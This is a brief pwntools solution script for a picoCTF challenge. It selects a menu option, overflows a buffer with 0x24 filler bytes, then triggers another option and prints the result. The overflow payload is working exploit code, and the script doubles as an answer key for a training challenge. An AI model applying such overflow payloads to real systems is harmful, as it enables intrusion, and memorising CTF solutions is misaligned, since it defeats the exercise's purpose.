from pwn import *

if args.REMOTE:
    r = remote('tethys.picoctf.net', 58618)
else:
    r = process('./chall')

r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'buffer: ', b'a'*0x24)

r.sendlineafter(b'choice: ', b'4')

print(r.recvall(timeout=1).decode())